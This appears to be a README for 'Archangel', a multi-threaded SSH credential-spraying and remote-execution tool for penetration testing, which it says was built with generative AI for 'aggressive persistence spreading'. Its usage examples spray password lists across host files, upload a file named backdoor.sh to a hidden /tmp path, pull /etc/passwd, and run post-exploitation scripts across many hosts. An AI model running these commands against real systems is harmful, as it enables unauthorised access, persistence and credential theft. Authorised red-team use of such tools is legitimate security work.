# 🔱 Archangel - SSH Automation & Credential Spraying Tool

A powerful, multi-threaded SSH automation tool designed for penetration testing and red team operations. Execute commands, transfer files, and spray credentials across multiple hosts simultaneously.

## DISCLAIMER: This tool was written using Generative AI, this tool was made to address a need for faster, aggressive persistence spreading.

```
    ╔═══════════════════════════════════════════════════════════╗
    ║              ARCHANGEL - SSH Automation Tool              ║
    ║         Remote Command Execution & File Transfer          ║
    ╚═══════════════════════════════════════════════════════════╝
```

## ⚡ Features

- 🎯 **Credential Spraying** - Test multiple username/password combinations across hosts
- 🔑 **Multiple Authentication** - Support for passwords and SSH keys (RSA, Ed25519, DSS, ECDSA)
- ⚙️ **Command Execution** - Run commands on single or multiple hosts
- 📤 **File Transfer** - Upload/download files via SFTP
- 📜 **Script Execution** - Execute local scripts on remote hosts
- 🧵 **Multi-threaded** - Concurrent connections for speed (configurable)
- 🔇 **Quiet Mode** - Minimal output for operational use
- 🔊 **Verbose Mode** - Detailed output for debugging
- 🛡️ **Robust Error Handling** - Clean output, no verbose exceptions
- 🔄 **Auto-retry** - Handles transient connection failures

## 🚀 Installation

```bash
# Install paramiko
pip3 install paramiko

# Make executable
chmod +x archangel.py

# Test
python3 archangel.py --help
```

## ⚡ Quick Start

### Single Host Command
```bash
python3 archangel.py --hosts 192.0.2.100 --users root --passwords toor --command "whoami"
```

### Credential Spray
```bash
python3 archangel.py --ips hosts.txt --users users.txt --passwords passwords.txt --command "id"
```

### File Upload
```bash
python3 archangel.py --hosts 192.0.2.50 --users admin --passwords admin --upload payload.sh:/tmp/payload.sh
```

## 📚 Usage Examples

### Command Execution

```bash
# Single host
python3 archangel.py --hosts 192.0.2.115 --users ralph --passwords Password123!@# --command "uname -a"

# Multiple hosts
python3 archangel.py --ips targets.txt --users root --passwords toor --command "whoami"

# With SSH key
python3 archangel.py --hosts 192.0.2.200 --users admin --keys ~/.ssh/id_rsa --command "ls -la"
```

### Credential Spraying

```bash
# Spray across network
python3 archangel.py \
  --ips subnet_hosts.txt \
  --users common_users.txt \
  --passwords common_passwords.txt \
  --command "id" \
  --threads 10
```

### File Operations

```bash
# Upload file
python3 archangel.py --hosts 192.0.2.10 --users admin --passwords pass --upload payload.sh:/tmp/payload.sh

# Download file
python3 archangel.py --hosts 192.0.2.98 --users root --passwords toor --download /etc/passwd:passwd.txt

# Upload to multiple hosts
python3 archangel.py --ips hosts.txt --users root --passwords pass --upload backdoor.sh:/tmp/.update
```

### Script Execution

```bash
# Execute enumeration script
python3 archangel.py --hosts 192.0.2.101 --users ralph --passwords pass --script enumerate.sh

# Execute on multiple hosts
python3 archangel.py --ips targets.txt --users admin --passwords admin --script post_exploit.sh --threads 5
```

### Advanced Operations

```bash
# Quiet mode (minimal output)
python3 archangel.py --quiet --ips network.txt --users users.txt --passwords passwords.txt --command "whoami"

# Verbose mode (debugging)
python3 archangel.py --verbose --hosts 192.0.2.65 --users ec2-user --passwords ec2-user --command "id"

# Custom SSH port
python3 archangel.py --hosts 192.0.2.150 --users admin --passwords admin --port 2222 --command "hostname"

# High thread count
python3 archangel.py --ips large_subnet.txt --users root --passwords toor --command "uptime" --threads 20

# Multiple SSH keys
python3 archangel.py --hosts 192.0.2.250 --users root --keys /path/to/keys/ --command "whoami"
```

## 📖 Command Reference

### Required Arguments

| Argument | Description | Example |
|----------|-------------|---------|
| `--hosts` | Single target IP/hostname | `--hosts 192.0.2.100` |
| `--ips` | File with IPs (one per line) | `--ips targets.txt` |
| `--users` | Username or file | `--users root` or `--users users.txt` |
| `--passwords` | Password or file | `--passwords toor` or `--passwords passwords.txt` |
| `--keys` | SSH key or directory | `--keys ~/.ssh/id_rsa` or `--keys /keys/` |

Must specify either `--hosts` OR `--ips`, and either `--passwords` OR `--keys`

### Action Arguments (at least one required)

| Argument | Description | Example |
|----------|-------------|---------|
| `--command` | Command to execute | `--command "whoami"` |
| `--upload` | Upload file `local:remote` | `--upload payload.sh:/tmp/payload.sh` |
| `--download` | Download file `remote:local` | `--download /etc/passwd:passwd.txt` |
| `--script` | Execute local script | `--script enumerate.sh` |

### Optional Arguments

| Argument | Default | Description |
|----------|---------|-------------|
| `--port` | 22 | SSH port |
| `--threads` | 4 | Number of concurrent threads |
| `--quiet` `-q` | Off | Minimal output mode |
| `--verbose` `-v` | Off | Detailed output mode |

## 📄 File Formats

### Hosts File
```
192.0.2.10
192.0.2.20
192.0.2.30
webserver.local
```

### Users File
```
root
admin
ubuntu
user
```

### Passwords File
```
password
Password123
admin
toor
```

## 🎯 Performance Tuning

| Scenario | Recommended Threads |
|----------|-------------------|
| Local network | 10-20 |
| Internet targets | 4-8 |
| Slow connections | 2-4 |
| Fast switches | 20-50 |

## 🔧 Troubleshooting

### No successful connections

**Checklist:**
- ✅ Verify network: `ping target`
- ✅ Check SSH port: `nc -zv target 22`
- ✅ Test manually: `ssh user@target`
- ✅ Try verbose mode: `--verbose`

### Slow execution

```bash
# Increase threads
python3 archangel.py --threads 20 ...

# Use quiet mode
python3 archangel.py --quiet ...
```

### Too much output

```bash
# Use quiet mode
python3 archangel.py --quiet ...
```

## 📊 Output Example

```
╔═══════════════════════════════════════════════════════════╗
║              ARCHANGEL - SSH Automation Tool              ║
║         Remote Command Execution & File Transfer          ║
╚═══════════════════════════════════════════════════════════╝

[*] Loaded 10 item(s) from hosts.txt
[*] Generated 150 credential combination(s)
[*] Starting operations with 4 thread(s)
[+] Connected to 192.0.2.115:22 as steve (password)
[+] Command completed on 192.0.2.115 (exit code: 0)

============================================================
EXECUTION SUMMARY
============================================================
[*] Total tasks: 150
[+] Successful: 12
[~] Failed: 138

Successful Connections:
  ✓ 192.0.2.115 (joe)
  ✓ 192.0.2.100 (admin)
  ✓ 192.0.2.101 (steve)
```

## 🔐 Security Considerations

⚠️ **This tool is NOISY:**
- Leaves SSH logs on all targets
- Authentication attempts are logged
- Uploaded files may be detected

## ⚠️ Legal Disclaimer

**AUTHORIZED USE ONLY**

This tool is designed for authorized penetration testing, red team exercises, and system administration only.

**Unauthorized access to computer systems is illegal.**

By using this tool, you agree to:
- Only use it on systems you own or have written permission to test
- Comply with all applicable laws and regulations
- Take responsibility for your actions

The authors are not responsible for misuse of this tool.

---